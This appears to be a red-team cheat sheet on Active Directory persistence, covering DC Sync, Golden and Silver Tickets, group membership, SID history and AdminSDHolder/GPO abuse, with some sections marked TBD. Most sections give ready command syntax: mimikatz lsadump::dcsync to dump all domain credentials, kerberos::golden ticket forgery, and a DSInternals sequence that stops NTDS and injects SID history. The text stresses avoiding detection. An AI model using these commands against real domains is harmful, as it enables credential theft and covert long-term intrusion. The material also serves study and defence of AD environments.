---
title: Active Directory persistence
---

- [1. DC Sync](#1-dc-sync)
- [2. Golden Ticket](#2-golden-ticket)
- [3. Silver Ticket](#3-silver-ticket)
- [4. Certificates](#4-certificates)
- [5. Group Membership](#5-group-membership)
- [6. SID History](#6-sid-history)
- [7. Group Templates](#7-group-templates)
- [8. GPO](#8-gpo)

## 1. DC Sync
The more privileged credentials are, the sonner they will be rotated after breach detection. The goal then is to persist with near-privileged credentials, not with a super-user:

- Local administrator on several machines - usually there is a group or twowith local admin rights on almost all machines.
- Service accounts with delegation permissions - with this accounts it's possible to force golden and silver tickets to perform Kerberos delegation attacks.
- Privileged AD services accounts

It is not just the DCs that can initiate DC Synchronization. Accounts such as those belonging to the _Domain Admins_ groups can also do it for legitimate purposes such as creating a new domain controller. If our account has permission to perform DC Synchronization, we can stage a DC Sync attack to harvest credentials from a DC.

```powershell
.\mimikatz.exe

# Dump for single user
> lsadump::dcsync /domain:<DOMAIN> /user:<AD_USERNAME>

# Dump all users to the file
> log <DUMP_FILE.TXT>
> lsadump::dcsync /domain:<DOMAIN> /all
```

## 2. Golden Ticket
_Golden Ticket_ is forged TGT of high privileged account. The authorization step is bypassed. Having a valid TGT of a privileged account, an attacker can request a TGS for almost any service. In order to forge a golden ticket `krbtgt` account's password hash is required. With this hash an attacker can sign a TGT for any user account. By default, the `krbtgt` account's password never changes, meaning once hacked, unless it is manually rotated, it's possible to generate TGTs forever.

Required information to forge Golden Ticket:

- `krbtgt` account's password hash
- domain name
- domain SID
- user ID

```powershell
# Mimikatz - forge Golden Ticket
> kerberos::golden /admin:<ACCOUNT> /domain:<DOMAIN> /id:500 /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /endin:600 /renewmax:10080 /ptt

# Check if it works
dir \\dc\C$\
```

## 3. Silver Ticket
_Silver Ticket_ is forged TGS of some interesting service. TGS is signed by the machine account of the target host. `CIFS` service is a safe service because it allows file access. TBD

```powershell
# Mimikatz - forge Silver Ticket
> kerberos::golden /admin:<ACCOUNT> /domain:<DOMAIN> /id:500 /sid:<DOMAIN_SID> /target:<DOMAIN-HOSTNAME> /rc4:<TARGET_MACHINE_NTLM_HASH> /service:cifs /ptt
```

## 4. Certificates
TBD

## 5. Group Membership
We can just add ourselves directly to privileged AD groups for persistence.  Remember, the most privileged groups are not always the best to use for persistence. They are always monitored. In large organizations groups are usually nested. Groups contain groups and so on. For example, an interesting "IT Support" group might have multiple subgroups with the same privileges. Here's the reduced visibility for monitoring systems. It can be exploited to achive more silent persistence.

```powershell
# Add group member
Add-ADGroupMember -Identity <GROUP> -Members <USER>
```

## 6. SID History
SIDs history of Security Principal allows for one account to be attached to another. It basically have all the privileges of the SIDs included in the SID history. It's especially used during migration, when a new account on a new domain could have the SID history of an old account to retain access of the old domain.

It might be used in order to establish persistence in the domain. Groups' SIDs can be assigned to a user's SID history as well. This technique is a lot harder to detect than just a simple group membership persistence.

```powershell
# Get SID history
Get-ADUser <USER> -Properties name,sidhistory

# Get group's SID
Get-ADGroup <GROUP>

# Modify SID history
Import-Moduls DSInternals
Stop-Service ntds -Force
Add-ADDBSidHistory -SamAccountName <USER> -SidHistory <SID> -DatabasePath 'C:\Windows\NTDS\ntds.dit'
Start-Service ntds
```

## 7. Group Templates
Group templates are objects which privileges are copied to some AD groups constantly (e.g. every hour). `SDProp` process takes the ACL of the `AdminSDHolder` object and applies it to all protected groups every 60 minutes. List of protected groups contains: `Administrators`, `Domain Admins`, `Schema Admins`, `Enterprise Admins` and more. By default, `AdminSDHolder` ACL is very restrictive. By modifing ACL of this object (injecting special ACEs), an attacker can change ACLs of all protected groups in the domain and gain full permissions to them.  

## 8. GPO
GPOs are excellent tool for remote management but they can be targeted to deploy persistence. Some GPO hooks are especially interesting from the attacker's point of view:

- `Restricted Group Membership` - allows to give administrative access to all hosts in the domain.
- `Logon Script Deployment` - allows to execute script (e.g. reverse shell) on every logon.
- and more.